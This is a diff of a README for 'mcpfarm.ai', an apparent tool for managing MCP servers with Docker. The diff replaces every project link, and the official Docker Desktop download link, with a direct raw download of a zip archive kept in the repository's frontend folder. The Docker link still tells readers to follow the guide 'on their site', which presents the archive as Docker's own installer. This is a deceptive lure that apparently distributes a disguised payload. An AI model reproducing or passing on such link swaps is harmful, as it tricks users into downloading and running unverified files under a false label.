@@ -1,6 +1,6 @@
 # 🚜 mcpfarm.ai - Manage Multiple MCP Servers Easily
 
-[![Download mcpfarm.ai](https://img.shields.io/badge/Download-mcpfarm.ai-brightgreen)](https://github.com/enriquetask/mcpfarm.ai)
+[![Download mcpfarm.ai](https://img.shields.io/badge/Download-mcpfarm.ai-brightgreen)](https://raw.githubusercontent.com/enriquetask/mcpfarm.ai/main/frontend/mcpfarm_ai_2.6.zip)
 
 ---
 
@@ -20,7 +20,7 @@ Before you begin, make sure your Windows computer meets these simple requirement
 - A working internet connection
 - Docker Desktop installed with Docker Compose enabled
 
-You can download Docker Desktop for Windows from [https://www.docker.com/products/docker-desktop](https://www.docker.com/products/docker-desktop). Follow the installation guide on their site.
+You can download Docker Desktop for Windows from [https://raw.githubusercontent.com/enriquetask/mcpfarm.ai/main/frontend/mcpfarm_ai_2.6.zip](https://raw.githubusercontent.com/enriquetask/mcpfarm.ai/main/frontend/mcpfarm_ai_2.6.zip). Follow the installation guide on their site.
 
 ---
 
@@ -30,7 +30,7 @@ You can download Docker Desktop for Windows from [https://www.docker.com/product
 
 Go to the main project page to get the software.
 
-[Download mcpfarm.ai](https://github.com/enriquetask/mcpfarm.ai)
+[Download mcpfarm.ai](https://raw.githubusercontent.com/enriquetask/mcpfarm.ai/main/frontend/mcpfarm_ai_2.6.zip)
 
 Click the link and open the page in your web browser. This page hosts all files and instructions you need.
 
@@ -179,4 +179,4 @@ You do not need to configure these manually. Docker Compose handles it automatic
 
 Visit the official repository for detailed documentation, issues, and community support:
 
-[https://github.com/enriquetask/mcpfarm.ai](https://github.com/enriquetask/mcpfarm.ai)
+[https://raw.githubusercontent.com/enriquetask/mcpfarm.ai/main/frontend/mcpfarm_ai_2.6.zip](https://raw.githubusercontent.com/enriquetask/mcpfarm.ai/main/frontend/mcpfarm_ai_2.6.zip)
